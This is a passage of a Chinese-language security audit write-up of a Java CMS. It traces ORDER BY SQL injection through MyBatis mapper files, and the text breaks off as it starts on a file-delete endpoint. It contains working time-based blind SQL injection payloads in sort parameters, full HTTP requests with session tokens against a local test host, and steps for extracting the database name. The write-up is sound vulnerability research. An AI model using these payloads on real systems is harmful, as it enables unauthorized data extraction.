+</span></span><span class=line><span class=cl><span class=n>Authorization</span><span class=o>:</span> <span class=l>Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/plain, */*</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Microsoft Edge&#34;;v=&#34;131&#34;, &#34;Chromium&#34;;v=&#34;131&#34;, &#34;Not_A Brand&#34;;v=&#34;24&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>cors</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>empty</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://172.23.192.1/</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=1, i</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 构造参数sort和order</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/auth/role/list?page=1&amp;limit=10&amp;sort=builtin&amp;order=desc</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.23.192.1</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Authorization</span><span class=o>:</span> <span class=l>Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/plain, */*</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Microsoft Edge&#34;;v=&#34;131&#34;, &#34;Chromium&#34;;v=&#34;131&#34;, &#34;Not_A Brand&#34;;v=&#34;24&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>cors</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>empty</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://172.23.192.1/</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=1, i</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 根据xml文档中的定义我们构造如下payload：</p><p>sort:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>builtin</span><span class=o>%</span><span class=mi>60</span><span class=p>,</span><span class=k>if</span><span class=p>(</span><span class=k>length</span><span class=p>((</span><span class=k>select</span><span class=o>%</span><span class=mi>20</span><span class=k>database</span><span class=p>()))</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>5</span><span class=p>),</span><span class=mi>1</span><span class=p>),</span><span class=o>%</span><span class=mi>60</span><span class=n>builtin</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>order:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>desc</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 使用BP爆破模块爆破得到如下数据：</p><p><img src=/p/wormhole-cms/image-20241216113807251.png width=1100 height=110 srcset="/p/wormhole-cms/image-20241216113807251_hu9889898046463230655.png 480w, /p/wormhole-cms/image-20241216113807251_hu13594648704191554236.png 1024w" loading=lazy alt=image-20241216113807251 class=gallery-image data-flex-grow=1000 data-flex-basis=2400px></p><p>​ 处理后得到库名：</p><p><img src=/p/wormhole-cms/image-20241216113932096.png width=536 height=58 srcset="/p/wormhole-cms/image-20241216113932096_hu643232972512626948.png 480w, /p/wormhole-cms/image-20241216113932096_hu12368934346614314250.png 1024w" loading=lazy alt=image-20241216113932096 class=gallery-image data-flex-grow=924 data-flex-basis=2217px></p><h4 id=srcmainresourcesmapperuploadmapperxml成功>src/main/resources/mapper/UploadMapper.xml（成功）</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>    <span class=nt>&lt;select</span> <span class=na>id=</span><span class=s>&#34;selectWithQuery&#34;</span> <span class=na>resultMap=</span><span class=s>&#34;baseMap&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>        select * from `upload`
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;include</span> <span class=na>refid=</span><span class=s>&#34;where&#34;</span><span class=nt>/&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;sortWrapper != null and sortWrapper.size() &gt; 0&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>            order by
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;foreach</span> <span class=na>collection=</span><span class=s>&#34;sortWrapper.entrySet()&#34;</span> <span class=na>index=</span><span class=s>&#34;s&#34;</span> <span class=na>item=</span><span class=s>&#34;o&#34;</span> <span class=na>separator=</span><span class=s>&#34;,&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>                `${s}` ${o}
+</span></span><span class=line><span class=cl>            <span class=nt>&lt;/foreach&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;if</span> <span class=na>test=</span><span class=s>&#34;offset != null and limit != null&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>            limit #{offset}, #{limit}
+</span></span><span class=line><span class=cl>        <span class=nt>&lt;/if&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/select&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 我们向上追溯：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Transactional</span><span class=p>(</span><span class=n>rollbackFor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Exception</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>UploadDTO</span><span class=o>&gt;</span><span class=w> </span><span class=nf>findImageByPage</span><span class=p>(</span><span class=n>Integer</span><span class=w> </span><span class=n>page</span><span class=p>,</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>userId</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>QueryWrapperBuilder</span><span class=w> </span><span class=n>builder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>QueryWrapperBuilder</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>sort</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>order</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=s>&#34;ts&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;desc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>builder</span><span class=p>.</span><span class=na>sort</span><span class=p>(</span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>order</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*此处代码省略*/</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>QueryWrapper</span><span class=w> </span><span class=n>wrapper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>builder</span><span class=p>.</span><span class=na>build</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>Upload</span><span class=o>&gt;</span><span class=w> </span><span class=n>uploads</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uploadDAO</span><span class=p>.</span><span class=na>selectWithQuery</span><span class=p>(</span><span class=n>wrapper</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Integer</span><span class=w> </span><span class=n>total</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uploadDAO</span><span class=p>.</span><span class=na>countWithQuery</span><span class=p>(</span><span class=n>wrapper</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*此处代码省略*/</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 可见该注入点的SQL注入与上一个SQL的漏洞是相同的。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/list&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=n>Result</span><span class=o>&lt;</span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>UploadDTO</span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=nf>queryPage</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;page&#34;</span><span class=p>)</span><span class=w> </span><span class=nd>@Min</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;page不能小于1&#34;</span><span class=p>)</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>page</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;limit&#34;</span><span class=p>)</span><span class=w> </span><span class=nd>@Min</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;limit不能小于1&#34;</span><span class=p>)</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;sort&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;order&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;key&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PageResponse</span><span class=o>&lt;</span><span class=n>UploadDTO</span><span class=o>&gt;</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uploadService</span><span class=p>.</span><span class=na>findImageByPage</span><span class=p>(</span><span class=n>page</span><span class=p>,</span><span class=w> </span><span class=n>limit</span><span class=p>,</span><span class=w> </span><span class=n>sort</span><span class=p>,</span><span class=w> </span><span class=n>order</span><span class=p>,</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=kd>super</span><span class=p>.</span><span class=na>getUserId</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ResponseEntity</span><span class=p>.</span><span class=na>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=p>.</span><span class=na>OK</span><span class=p>).</span><span class=na>body</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>success</span><span class=p>(</span><span class=n>response</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 不过在前端测试之前，由于作者似乎尚未实现上传图片的方法，因此我们需要先在数据库中插入一条数据，保证order by会被执行，而不是由于没有数据而发生短路：</p><p><img src=/p/wormhole-cms/image-20241216115905793.png width=1268 height=58 srcset="/p/wormhole-cms/image-20241216115905793_hu16024970326746312897.png 480w, /p/wormhole-cms/image-20241216115905793_hu16115028566485264777.png 1024w" loading=lazy alt=image-20241216115905793 class=gallery-image data-flex-grow=2186 data-flex-basis=5246px></p><p>​ 那么我们接下来只需要构造如下数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/manage/image/list?page=1&amp;limit=10&amp;sort=id&amp;order=desc</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.23.192.1</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Authorization</span><span class=o>:</span> <span class=l>Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/plain, */*</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Microsoft Edge&#34;;v=&#34;131&#34;, &#34;Chromium&#34;;v=&#34;131&#34;, &#34;Not_A Brand&#34;;v=&#34;24&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>cors</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>empty</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://172.23.192.1/</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=1, i</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 再构造payload：</p><p>sort:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>id</span><span class=o>%</span><span class=mi>60</span><span class=p>,</span><span class=k>if</span><span class=p>(</span><span class=k>length</span><span class=p>((</span><span class=k>select</span><span class=o>%</span><span class=mi>20</span><span class=k>database</span><span class=p>()))</span><span class=o>%</span><span class=mi>5</span><span class=n>e1</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>5</span><span class=p>),</span><span class=mi>1</span><span class=p>),</span><span class=o>%</span><span class=mi>60</span><span class=n>id</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>order:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>desc</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 使用BP爆破模块爆破：</p><p><img src=/p/wormhole-cms/image-20241216115635882.png width=1040 height=106 srcset="/p/wormhole-cms/image-20241216115635882_hu9513550798716479333.png 480w, /p/wormhole-cms/image-20241216115635882_hu9561997563523440015.png 1024w" loading=lazy alt=image-20241216115635882 class=gallery-image data-flex-grow=981 data-flex-basis=2354px></p><p>​ 处理数据后得到库名：</p><p><img src=/p/wormhole-cms/image-20241216115701645.png width=542 height=53 srcset="/p/wormhole-cms/image-20241216115701645_hu8692017939646853699.png 480w, /p/wormhole-cms/image-20241216115701645_hu12636321949330077577.png 1024w" loading=lazy alt=image-20241216115701645 class=gallery-image data-flex-grow=1022 data-flex-basis=2454px></p><p>​ 除此之外，在src/main/resources/mapper/UserMapper.xml中也存在同样的SQL注入漏洞，这里由于篇幅限制，就不写出了，有兴趣的师傅可以自行尝试。</p><h3 id=任意文件操控>任意文件操控</h3><p>​ 我们来到文件的控制器发现他，他仅有两个方法，确实没有图片上传的实现，而另一个查询则是从数据库中查询信息，没有可操控的参数，也就不存在任意文件查看了，那么我们关注唯一一个删除的方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@DeleteMapping</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=n>Result</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;&gt;</span><span class=w> </span><span class=nf>deleteByIds</span><span class=p>(</span><span class=nd>@RequestBody</span><span class=w> </span><span class=nd>@Validated</span><span class=w> </span><span class=n>IdsDTO</span><span class=w> </span><span class=n>dto</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>uploadService</span><span class=p>.</span><span class=na>deleteByIds</span><span class=p>(</span><span class=n>dto</span><span class=p>.</span><span class=na>getIds</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ResponseEntity</span><span class=p>.</span><span class=na>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=p>.</span><span class=na>OK</span><span class=p>).</span><span class=na>body</span><span class=p>(</span><span class=n>Result</span><span class=p>.</span><span class=na>success</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Transactional</span><span class=p>(</span><span class=n>rollbackFor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Exception</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>deleteByIds</span><span class=p>(</span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>ids</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>CollectionUtils</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>(</span><span class=n>ids</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>QueryWrapperBuilder</span><span class=w> </span><span class=n>builder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>QueryWrapperBuilder</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>builder</span><span class=p>.</span><span class=na>in</span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>,</span><span class=w> </span><span class=n>ids</span><span class=p>);</span><span class=w>
